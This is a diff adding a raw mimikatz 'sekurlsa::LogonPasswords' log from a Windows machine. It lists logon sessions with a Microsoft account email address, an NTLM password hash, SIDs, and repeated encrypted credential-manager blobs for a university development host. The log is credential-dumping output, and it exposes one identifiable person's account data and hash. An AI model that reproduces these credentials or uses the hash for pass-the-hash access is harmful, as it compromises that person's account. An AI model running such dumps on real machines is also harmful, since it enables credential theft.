@@ -1,0 +1,316 @@
+Using 'mimikatz.log' for logfile : OK
+
+mimikatz # sekurlsa::LogonPasswords
+
+Authentication Id : 0 ; 82984784 (00000000:04f23f50)
+Session           : Interactive from 2
+User Name         : BINH
+Domain            : BINHDUCNGUYEN
+Logon Server      : (null)
+Logon Time        : 11/24/2015 8:40:14 AM
+SID               : S-1-5-21-3900016582-2860076126-1336739147-1002
+	msv :	
+	 [00000003] Primary
+	 * Username : nguyenducbinh83@yahoo.com
+	 * Domain   : MicrosoftAccount
+	 * Flags    : I00/N01/L00/S00
+	 * NTLM     : 1756ada2704ef8e26dba3074ffaf1bb5
+	tspkg :	
+	wdigest :	
+	 * Username : nguyenducbinh83@yahoo.com
+	 * Domain   : MicrosoftAccount
+	 * Password : (null)
+	kerberos :	
+	 * Username : nguyenducbinh83@yahoo.com
+	 * Domain   : MicrosoftAccount
+	 * Password : (null)
+	ssp :	
+	credman :	
+	 [00000000]
+	 * Username : (null)
+	 * Domain   : Microsoft_WinInet_dev.iu7.bmstu.ru:80/Dev-iu7
+	 * Password : 01 00 00 00 d0 8c 9d df 01 15 d1 11 8c 7a 00 c0 4f c2 97 eb 01 00 00 00 bb 04 dd 48 55 b0 39 49 9c f1 42 89 7f 04 53 50 00 00 00 00 18 00 00 00 57 00 49 00 4e 00 49 00 4e 00 45 00 54 00 43 00 72 00 65 00 64 00 00 00 10 66 00 00 00 01 00 00 20 00 00 00 8a f2 bc 66 27 e6 33 47 dc 2b 74 71 0b 92 05 3f 97 84 9b a0 00 c6 f6 40 42 8a 09 7a 88 f2 e7 9e 00 00 00 00 0e 80 00 00 00 02 00 00 20 00 00 00 68 6e ca 98 dd 73 11 38 d4 66 26 25 c2 28 a1 ab 66 57 03 92 9e e1 b0 42 4c a3 dc 22 ce 0e 8b cc 50 00 00 00 dc 8b f9 97 03 69 b3 2e bb 86 34 dd d8 52 46 78 f1 cc 9e 09 4f 9d 16 42 b7 b9 91 90 51 de 54 ab 2b 4b ad b9 4e c5 df b7 bc 61 85 c3 13 3a 84 51 db 6d 9f fa b0 0f 35 e5 4a f5 a9 f4 75 cf 19 74 a1 ea 76 34 55 20 8d ce 28 f5 03 ae cf 4c b6 6d 40 00 00 00 81 cc 17 04 b3 b1 a5 21 d3 a3 e4 3c f6 f2 13 52 64 ae 61 39 0b 16 ac be 96 96 14 3d d7 ef c6 aa f6 fa ee 8e d2 4e 1c 2d b8 f7 eb cd e2 0c ea 01 d9 d9 56 db fd 52 f6 e5 f2 a9 88 2a b2 4e af 10 00 00 00 00 
+
+Authentication Id : 0 ; 82984730 (00000000:04f23f1a)
+Session           : Interactive from 2
+User Name         : BINH
+Domain            : BINHDUCNGUYEN
+Logon Server      : (null)
+Logon Time        : 11/24/2015 8:40:14 AM
+SID               : S-1-5-21-3900016582-2860076126-1336739147-1002
+	msv :	
+	 [00000003] Primary
+	 * Username : nguyenducbinh83@yahoo.com
+	 * Domain   : MicrosoftAccount
+	 * Flags    : I00/N01/L00/S00
+	 * NTLM     : 1756ada2704ef8e26dba3074ffaf1bb5
+	tspkg :	
+	wdigest :	
+	 * Username : nguyenducbinh83@yahoo.com
+	 * Domain   : MicrosoftAccount
+	 * Password : (null)
+	kerberos :	
+	 * Username : nguyenducbinh83@yahoo.com
+	 * Domain   : MicrosoftAccount
+	 * Password : (null)
+	ssp :	
+	credman :	
+	 [00000000]
+	 * Username : (null)
+	 * Domain   : Microsoft_WinInet_dev.iu7.bmstu.ru:80/Dev-iu7
+	 * Password : 01 00 00 00 d0 8c 9d df 01 15 d1 11 8c 7a 00 c0 4f c2 97 eb 01 00 00 00 bb 04 dd 48 55 b0 39 49 9c f1 42 89 7f 04 53 50 00 00 00 00 18 00 00 00 57 00 49 00 4e 00 49 00 4e 00 45 00 54 00 43 00 72 00 65 00 64 00 00 00 10 66 00 00 00 01 00 00 20 00 00 00 8a f2 bc 66 27 e6 33 47 dc 2b 74 71 0b 92 05 3f 97 84 9b a0 00 c6 f6 40 42 8a 09 7a 88 f2 e7 9e 00 00 00 00 0e 80 00 00 00 02 00 00 20 00 00 00 68 6e ca 98 dd 73 11 38 d4 66 26 25 c2 28 a1 ab 66 57 03 92 9e e1 b0 42 4c a3 dc 22 ce 0e 8b cc 50 00 00 00 dc 8b f9 97 03 69 b3 2e bb 86 34 dd d8 52 46 78 f1 cc 9e 09 4f 9d 16 42 b7 b9 91 90 51 de 54 ab 2b 4b ad b9 4e c5 df b7 bc 61 85 c3 13 3a 84 51 db 6d 9f fa b0 0f 35 e5 4a f5 a9 f4 75 cf 19 74 a1 ea 76 34 55 20 8d ce 28 f5 03 ae cf 4c b6 6d 40 00 00 00 81 cc 17 04 b3 b1 a5 21 d3 a3 e4 3c f6 f2 13 52 64 ae 61 39 0b 16 ac be 96 96 14 3d d7 ef c6 aa f6 fa ee 8e d2 4e 1c 2d b8 f7 eb cd e2 0c ea 01 d9 d9 56 db fd 52 f6 e5 f2 a9 88 2a b2 4e af 10 00 00 00 00 
+
+Authentication Id : 0 ; 82775485 (00000000:04ef0dbd)
+Session           : Interactive from 2
+User Name         : DWM-2
+Domain            : Window Manager
+Logon Server      : (null)
+Logon Time        : 11/24/2015 2:34:56 AM
+SID               : S-1-5-90-0-2
+	msv :	
+	tspkg :	
+	wdigest :	
+	 * Username : BINHDUCNGUYEN$
+	 * Domain   : WORKGROUP
+	 * Password : (null)
+	kerberos :	
+	ssp :	
+	credman :	
+
+Authentication Id : 0 ; 82775458 (00000000:04ef0da2)
+Session           : Interactive from 2
+User Name         : DWM-2
+Domain            : Window Manager
+Logon Server      : (null)
+Logon Time        : 11/24/2015 2:34:56 AM
+SID               : S-1-5-90-0-2
+	msv :	
+	tspkg :	
+	wdigest :	
+	 * Username : BINHDUCNGUYEN$
+	 * Domain   : WORKGROUP
+	 * Password : (null)
+	kerberos :	
+	ssp :	
+	credman :	
+
+Authentication Id : 0 ; 67498653 (00000000:0405f29d)
+Session           : Interactive from 1
+User Name         : BINH
+Domain            : BINHDUCNGUYEN
+Logon Server      : (null)
+Logon Time        : 11/23/2015 1:39:43 PM
+SID               : S-1-5-21-3900016582-2860076126-1336739147-1002
+	msv :	
+	tspkg :	
+	wdigest :	
+	kerberos :	
+	ssp :	
+	credman :	
+	 [00000000]
+	 * Username : (null)
+	 * Domain   : Microsoft_WinInet_dev.iu7.bmstu.ru:80/Dev-iu7
+	 * Password : 01 00 00 00 d0 8c 9d df 01 15 d1 11 8c 7a 00 c0 4f c2 97 eb 01 00 00 00 bb 04 dd 48 55 b0 39 49 9c f1 42 89 7f 04 53 50 00 00 00 00 18 00 00 00 57 00 49 00 4e 00 49 00 4e 00 45 00 54 00 43 00 72 00 65 00 64 00 00 00 10 66 00 00 00 01 00 00 20 00 00 00 8a f2 bc 66 27 e6 33 47 dc 2b 74 71 0b 92 05 3f 97 84 9b a0 00 c6 f6 40 42 8a 09 7a 88 f2 e7 9e 00 00 00 00 0e 80 00 00 00 02 00 00 20 00 00 00 68 6e ca 98 dd 73 11 38 d4 66 26 25 c2 28 a1 ab 66 57 03 92 9e e1 b0 42 4c a3 dc 22 ce 0e 8b cc 50 00 00 00 dc 8b f9 97 03 69 b3 2e bb 86 34 dd d8 52 46 78 f1 cc 9e 09 4f 9d 16 42 b7 b9 91 90 51 de 54 ab 2b 4b ad b9 4e c5 df b7 bc 61 85 c3 13 3a 84 51 db 6d 9f fa b0 0f 35 e5 4a f5 a9 f4 75 cf 19 74 a1 ea 76 34 55 20 8d ce 28 f5 03 ae cf 4c b6 6d 40 00 00 00 81 cc 17 04 b3 b1 a5 21 d3 a3 e4 3c f6 f2 13 52 64 ae 61 39 0b 16 ac be 96 96 14 3d d7 ef c6 aa f6 fa ee 8e d2 4e 1c 2d b8 f7 eb cd e2 0c ea 01 d9 d9 56 db fd 52 f6 e5 f2 a9 88 2a b2 4e af 10 00 00 00 00 
+
+Authentication Id : 0 ; 67498590 (00000000:0405f25e)
+Session           : Interactive from 1
+User Name         : BINH
+Domain            : BINHDUCNGUYEN
+Logon Server      : (null)
+Logon Time        : 11/23/2015 1:39:43 PM
+SID               : S-1-5-21-3900016582-2860076126-1336739147-1002
+	msv :	
+	tspkg :	
+	wdigest :	
+	kerberos :	
+	ssp :	
+	credman :	
+	 [00000000]
+	 * Username : (null)
+	 * Domain   : Microsoft_WinInet_dev.iu7.bmstu.ru:80/Dev-iu7
+	 * Password : 01 00 00 00 d0 8c 9d df 01 15 d1 11 8c 7a 00 c0 4f c2 97 eb 01 00 00 00 bb 04 dd 48 55 b0 39 49 9c f1 42 89 7f 04 53 50 00 00 00 00 18 00 00 00 57 00 49 00 4e 00 49 00 4e 00 45 00 54 00 43 00 72 00 65 00 64 00 00 00 10 66 00 00 00 01 00 00 20 00 00 00 8a f2 bc 66 27 e6 33 47 dc 2b 74 71 0b 92 05 3f 97 84 9b a0 00 c6 f6 40 42 8a 09 7a 88 f2 e7 9e 00 00 00 00 0e 80 00 00 00 02 00 00 20 00 00 00 68 6e ca 98 dd 73 11 38 d4 66 26 25 c2 28 a1 ab 66 57 03 92 9e e1 b0 42 4c a3 dc 22 ce 0e 8b cc 50 00 00 00 dc 8b f9 97 03 69 b3 2e bb 86 34 dd d8 52 46 78 f1 cc 9e 09 4f 9d 16 42 b7 b9 91 90 51 de 54 ab 2b 4b ad b9 4e c5 df b7 bc 61 85 c3 13 3a 84 51 db 6d 9f fa b0 0f 35 e5 4a f5 a9 f4 75 cf 19 74 a1 ea 76 34 55 20 8d ce 28 f5 03 ae cf 4c b6 6d 40 00 00 00 81 cc 17 04 b3 b1 a5 21 d3 a3 e4 3c f6 f2 13 52 64 ae 61 39 0b 16 ac be 96 96 14 3d d7 ef c6 aa f6 fa ee 8e d2 4e 1c 2d b8 f7 eb cd e2 0c ea 01 d9 d9 56 db fd 52 f6 e5 f2 a9 88 2a b2 4e af 10 00 00 00 00 
+
+Authentication Id : 0 ; 39271433 (00000000:02573c09)
+Session           : Interactive from 3
+User Name         : BINH
+Domain            : BINHDUCNGUYEN
+Logon Server      : (null)
+Logon Time        : 11/22/2015 3:14:22 PM
+SID               : S-1-5-21-3900016582-2860076126-1336739147-1002
+	msv :	
+	tspkg :	
+	wdigest :	
+	kerberos :	
+	ssp :	
+	credman :	
+	 [00000000]
+	 * Username : (null)
+	 * Domain   : Microsoft_WinInet_dev.iu7.bmstu.ru:80/Dev-iu7
+	 * Password : 01 00 00 00 d0 8c 9d df 01 15 d1 11 8c 7a 00 c0 4f c2 97 eb 01 00 00 00 bb 04 dd 48 55 b0 39 49 9c f1 42 89 7f 04 53 50 00 00 00 00 18 00 00 00 57 00 49 00 4e 00 49 00 4e 00 45 00 54 00 43 00 72 00 65 00 64 00 00 00 10 66 00 00 00 01 00 00 20 00 00 00 8a f2 bc 66 27 e6 33 47 dc 2b 74 71 0b 92 05 3f 97 84 9b a0 00 c6 f6 40 42 8a 09 7a 88 f2 e7 9e 00 00 00 00 0e 80 00 00 00 02 00 00 20 00 00 00 68 6e ca 98 dd 73 11 38 d4 66 26 25 c2 28 a1 ab 66 57 03 92 9e e1 b0 42 4c a3 dc 22 ce 0e 8b cc 50 00 00 00 dc 8b f9 97 03 69 b3 2e bb 86 34 dd d8 52 46 78 f1 cc 9e 09 4f 9d 16 42 b7 b9 91 90 51 de 54 ab 2b 4b ad b9 4e c5 df b7 bc 61 85 c3 13 3a 84 51 db 6d 9f fa b0 0f 35 e5 4a f5 a9 f4 75 cf 19 74 a1 ea 76 34 55 20 8d ce 28 f5 03 ae cf 4c b6 6d 40 00 00 00 81 cc 17 04 b3 b1 a5 21 d3 a3 e4 3c f6 f2 13 52 64 ae 61 39 0b 16 ac be 96 96 14 3d d7 ef c6 aa f6 fa ee 8e d2 4e 1c 2d b8 f7 eb cd e2 0c ea 01 d9 d9 56 db fd 52 f6 e5 f2 a9 88 2a b2 4e af 10 00 00 00 00 
+
+Authentication Id : 0 ; 39271370 (00000000:02573bca)
+Session           : Interactive from 3
+User Name         : BINH
+Domain            : BINHDUCNGUYEN
+Logon Server      : (null)
+Logon Time        : 11/22/2015 3:14:22 PM
+SID               : S-1-5-21-3900016582-2860076126-1336739147-1002
+	msv :	
+	tspkg :	
+	wdigest :	
+	kerberos :	
+	ssp :	
+	credman :	
+	 [00000000]
+	 * Username : (null)
+	 * Domain   : Microsoft_WinInet_dev.iu7.bmstu.ru:80/Dev-iu7
+	 * Password : 01 00 00 00 d0 8c 9d df 01 15 d1 11 8c 7a 00 c0 4f c2 97 eb 01 00 00 00 bb 04 dd 48 55 b0 39 49 9c f1 42 89 7f 04 53 50 00 00 00 00 18 00 00 00 57 00 49 00 4e 00 49 00 4e 00 45 00 54 00 43 00 72 00 65 00 64 00 00 00 10 66 00 00 00 01 00 00 20 00 00 00 8a f2 bc 66 27 e6 33 47 dc 2b 74 71 0b 92 05 3f 97 84 9b a0 00 c6 f6 40 42 8a 09 7a 88 f2 e7 9e 00 00 00 00 0e 80 00 00 00 02 00 00 20 00 00 00 68 6e ca 98 dd 73 11 38 d4 66 26 25 c2 28 a1 ab 66 57 03 92 9e e1 b0 42 4c a3 dc 22 ce 0e 8b cc 50 00 00 00 dc 8b f9 97 03 69 b3 2e bb 86 34 dd d8 52 46 78 f1 cc 9e 09 4f 9d 16 42 b7 b9 91 90 51 de 54 ab 2b 4b ad b9 4e c5 df b7 bc 61 85 c3 13 3a 84 51 db 6d 9f fa b0 0f 35 e5 4a f5 a9 f4 75 cf 19 74 a1 ea 76 34 55 20 8d ce 28 f5 03 ae cf 4c b6 6d 40 00 00 00 81 cc 17 04 b3 b1 a5 21 d3 a3 e4 3c f6 f2 13 52 64 ae 61 39 0b 16 ac be 96 96 14 3d d7 ef c6 aa f6 fa ee 8e d2 4e 1c 2d b8 f7 eb cd e2 0c ea 01 d9 d9 56 db fd 52 f6 e5 f2 a9 88 2a b2 4e af 10 00 00 00 00 
+
+Authentication Id : 0 ; 11984842 (00000000:00b6dfca)
+Session           : Interactive from 2
+User Name         : BINH
+Domain            : BINHDUCNGUYEN
+Logon Server      : (null)
+Logon Time        : 11/21/2015 11:34:27 PM
+SID               : S-1-5-21-3900016582-2860076126-1336739147-1002
+	msv :	
+	tspkg :	
+	wdigest :	
+	kerberos :	
+	ssp :	
+	credman :	
+	 [00000000]
+	 * Username : (null)
+	 * Domain   : Microsoft_WinInet_dev.iu7.bmstu.ru:80/Dev-iu7
+	 * Password : 01 00 00 00 d0 8c 9d df 01 15 d1 11 8c 7a 00 c0 4f c2 97 eb 01 00 00 00 bb 04 dd 48 55 b0 39 49 9c f1 42 89 7f 04 53 50 00 00 00 00 18 00 00 00 57 00 49 00 4e 00 49 00 4e 00 45 00 54 00 43 00 72 00 65 00 64 00 00 00 10 66 00 00 00 01 00 00 20 00 00 00 8a f2 bc 66 27 e6 33 47 dc 2b 74 71 0b 92 05 3f 97 84 9b a0 00 c6 f6 40 42 8a 09 7a 88 f2 e7 9e 00 00 00 00 0e 80 00 00 00 02 00 00 20 00 00 00 68 6e ca 98 dd 73 11 38 d4 66 26 25 c2 28 a1 ab 66 57 03 92 9e e1 b0 42 4c a3 dc 22 ce 0e 8b cc 50 00 00 00 dc 8b f9 97 03 69 b3 2e bb 86 34 dd d8 52 46 78 f1 cc 9e 09 4f 9d 16 42 b7 b9 91 90 51 de 54 ab 2b 4b ad b9 4e c5 df b7 bc 61 85 c3 13 3a 84 51 db 6d 9f fa b0 0f 35 e5 4a f5 a9 f4 75 cf 19 74 a1 ea 76 34 55 20 8d ce 28 f5 03 ae cf 4c b6 6d 40 00 00 00 81 cc 17 04 b3 b1 a5 21 d3 a3 e4 3c f6 f2 13 52 64 ae 61 39 0b 16 ac be 96 96 14 3d d7 ef c6 aa f6 fa ee 8e d2 4e 1c 2d b8 f7 eb cd e2 0c ea 01 d9 d9 56 db fd 52 f6 e5 f2 a9 88 2a b2 4e af 10 00 00 00 00 
+
+Authentication Id : 0 ; 11984775 (00000000:00b6df87)
+Session           : Interactive from 2
+User Name         : BINH
+Domain            : BINHDUCNGUYEN
+Logon Server      : (null)
+Logon Time        : 11/21/2015 11:34:27 PM
+SID               : S-1-5-21-3900016582-2860076126-1336739147-1002
+	msv :	
+	tspkg :	
+	wdigest :	
+	kerberos :	
+	ssp :	
+	credman :	
+	 [00000000]
+	 * Username : (null)
+	 * Domain   : Microsoft_WinInet_dev.iu7.bmstu.ru:80/Dev-iu7
+	 * Password : 01 00 00 00 d0 8c 9d df 01 15 d1 11 8c 7a 00 c0 4f c2 97 eb 01 00 00 00 bb 04 dd 48 55 b0 39 49 9c f1 42 89 7f 04 53 50 00 00 00 00 18 00 00 00 57 00 49 00 4e 00 49 00 4e 00 45 00 54 00 43 00 72 00 65 00 64 00 00 00 10 66 00 00 00 01 00 00 20 00 00 00 8a f2 bc 66 27 e6 33 47 dc 2b 74 71 0b 92 05 3f 97 84 9b a0 00 c6 f6 40 42 8a 09 7a 88 f2 e7 9e 00 00 00 00 0e 80 00 00 00 02 00 00 20 00 00 00 68 6e ca 98 dd 73 11 38 d4 66 26 25 c2 28 a1 ab 66 57 03 92 9e e1 b0 42 4c a3 dc 22 ce 0e 8b cc 50 00 00 00 dc 8b f9 97 03 69 b3 2e bb 86 34 dd d8 52 46 78 f1 cc 9e 09 4f 9d 16 42 b7 b9 91 90 51 de 54 ab 2b 4b ad b9 4e c5 df b7 bc 61 85 c3 13 3a 84 51 db 6d 9f fa b0 0f 35 e5 4a f5 a9 f4 75 cf 19 74 a1 ea 76 34 55 20 8d ce 28 f5 03 ae cf 4c b6 6d 40 00 00 00 81 cc 17 04 b3 b1 a5 21 d3 a3 e4 3c f6 f2 13 52 64 ae 61 39 0b 16 ac be 96 96 14 3d d7 ef c6 aa f6 fa ee 8e d2 4e 1c 2d b8 f7 eb cd e2 0c ea 01 d9 d9 56 db fd 52 f6 e5 f2 a9 88 2a b2 4e af 10 00 00 00 00 
+
+Authentication Id : 0 ; 1589338 (00000000:0018405a)
+Session           : Interactive from 1
+User Name         : BINH
+Domain            : BINHDUCNGUYEN
+Logon Server      : (null)
+Logon Time        : 11/21/2015 8:31:30 PM
+SID               : S-1-5-21-3900016582-2860076126-1336739147-1002
+	msv :	
+	tspkg :	
+	wdigest :	
+	kerberos :	
+	ssp :	
+	credman :	
+	 [00000000]
+	 * Username : (null)
+	 * Domain   : Microsoft_WinInet_dev.iu7.bmstu.ru:80/Dev-iu7
+	 * Password : 01 00 00 00 d0 8c 9d df 01 15 d1 11 8c 7a 00 c0 4f c2 97 eb 01 00 00 00 bb 04 dd 48 55 b0 39 49 9c f1 42 89 7f 04 53 50 00 00 00 00 18 00 00 00 57 00 49 00 4e 00 49 00 4e 00 45 00 54 00 43 00 72 00 65 00 64 00 00 00 10 66 00 00 00 01 00 00 20 00 00 00 8a f2 bc 66 27 e6 33 47 dc 2b 74 71 0b 92 05 3f 97 84 9b a0 00 c6 f6 40 42 8a 09 7a 88 f2 e7 9e 00 00 00 00 0e 80 00 00 00 02 00 00 20 00 00 00 68 6e ca 98 dd 73 11 38 d4 66 26 25 c2 28 a1 ab 66 57 03 92 9e e1 b0 42 4c a3 dc 22 ce 0e 8b cc 50 00 00 00 dc 8b f9 97 03 69 b3 2e bb 86 34 dd d8 52 46 78 f1 cc 9e 09 4f 9d 16 42 b7 b9 91 90 51 de 54 ab 2b 4b ad b9 4e c5 df b7 bc 61 85 c3 13 3a 84 51 db 6d 9f fa b0 0f 35 e5 4a f5 a9 f4 75 cf 19 74 a1 ea 76 34 55 20 8d ce 28 f5 03 ae cf 4c b6 6d 40 00 00 00 81 cc 17 04 b3 b1 a5 21 d3 a3 e4 3c f6 f2 13 52 64 ae 61 39 0b 16 ac be 96 96 14 3d d7 ef c6 aa f6 fa ee 8e d2 4e 1c 2d b8 f7 eb cd e2 0c ea 01 d9 d9 56 db fd 52 f6 e5 f2 a9 88 2a b2 4e af 10 00 00 00 00 
+
+Authentication Id : 0 ; 1589281 (00000000:00184021)
+Session           : Interactive from 1
+User Name         : BINH
+Domain            : BINHDUCNGUYEN
+Logon Server      : (null)
+Logon Time        : 11/21/2015 8:31:30 PM
+SID               : S-1-5-21-3900016582-2860076126-1336739147-1002
+	msv :	
+	tspkg :	
+	wdigest :	
+	kerberos :	
+	ssp :	
+	credman :	
+	 [00000000]
+	 * Username : (null)
+	 * Domain   : Microsoft_WinInet_dev.iu7.bmstu.ru:80/Dev-iu7
+	 * Password : 01 00 00 00 d0 8c 9d df 01 15 d1 11 8c 7a 00 c0 4f c2 97 eb 01 00 00 00 bb 04 dd 48 55 b0 39 49 9c f1 42 89 7f 04 53 50 00 00 00 00 18 00 00 00 57 00 49 00 4e 00 49 00 4e 00 45 00 54 00 43 00 72 00 65 00 64 00 00 00 10 66 00 00 00 01 00 00 20 00 00 00 8a f2 bc 66 27 e6 33 47 dc 2b 74 71 0b 92 05 3f 97 84 9b a0 00 c6 f6 40 42 8a 09 7a 88 f2 e7 9e 00 00 00 00 0e 80 00 00 00 02 00 00 20 00 00 00 68 6e ca 98 dd 73 11 38 d4 66 26 25 c2 28 a1 ab 66 57 03 92 9e e1 b0 42 4c a3 dc 22 ce 0e 8b cc 50 00 00 00 dc 8b f9 97 03 69 b3 2e bb 86 34 dd d8 52 46 78 f1 cc 9e 09 4f 9d 16 42 b7 b9 91 90 51 de 54 ab 2b 4b ad b9 4e c5 df b7 bc 61 85 c3 13 3a 84 51 db 6d 9f fa b0 0f 35 e5 4a f5 a9 f4 75 cf 19 74 a1 ea 76 34 55 20 8d ce 28 f5 03 ae cf 4c b6 6d 40 00 00 00 81 cc 17 04 b3 b1 a5 21 d3 a3 e4 3c f6 f2 13 52 64 ae 61 39 0b 16 ac be 96 96 14 3d d7 ef c6 aa f6 fa ee 8e d2 4e 1c 2d b8 f7 eb cd e2 0c ea 01 d9 d9 56 db fd 52 f6 e5 f2 a9 88 2a b2 4e af 10 00 00 00 00 
+
+Authentication Id : 0 ; 997 (00000000:000003e5)
+Session           : Service from 0
+User Name         : LOCAL SERVICE
+Domain            : NT AUTHORITY
+Logon Server      : (null)
+Logon Time        : 11/21/2015 6:25:22 PM
+SID               : S-1-5-19
+	msv :	
+	tspkg :	
+	wdigest :	
+	 * Username : (null)
+	 * Domain   : (null)
+	 * Password : (null)
+	kerberos :	
+	 * Username : (null)
+	 * Domain   : (null)
+	 * Password : (null)
+	ssp :	
+	credman :	
+
+Authentication Id : 0 ; 996 (00000000:000003e4)
+Session           : Service from 0
+User Name         : BINHDUCNGUYEN$
+Domain            : WORKGROUP
+Logon Server      : (null)
+Logon Time        : 11/21/2015 6:25:21 PM
+SID               : S-1-5-20
+	msv :	
+	tspkg :	
+	wdigest :	
+	 * Username : BINHDUCNGUYEN$
+	 * Domain   : WORKGROUP
+	 * Password : (null)
+	kerberos :	
+	 * Username : binhducnguyen$
+	 * Domain   : WORKGROUP
+	 * Password : (null)
+	ssp :	
+	credman :	
+
+Authentication Id : 0 ; 36017 (00000000:00008cb1)
+Session           : UndefinedLogonType from 0
+User Name         : (null)
+Domain            : (null)
+Logon Server      : (null)
+Logon Time        : 11/21/2015 6:25:16 PM
+SID               : 
+	msv :	
+	tspkg :	
+	wdigest :	
+	kerberos :	
+	ssp :	
+	credman :	
+
+Authentication Id : 0 ; 999 (00000000:000003e7)
+Session           : UndefinedLogonType from 0
+User Name         : BINHDUCNGUYEN$
+Domain            : WORKGROUP
+Logon Server      : (null)
+Logon Time        : 11/21/2015 6:25:16 PM
+SID               : S-1-5-18
+	msv :	
+	tspkg :	
+	wdigest :	
+	 * Username : BINHDUCNGUYEN$
+	 * Domain   : WORKGROUP
+	 * Password : (null)
+	kerberos :	
+	 * Username : binhducnguyen$
+	 * Domain   : WORKGROUP
+	 * Password : (null)
+	ssp :	
+	credman :	
+
+mimikatz # exit
+Bye!
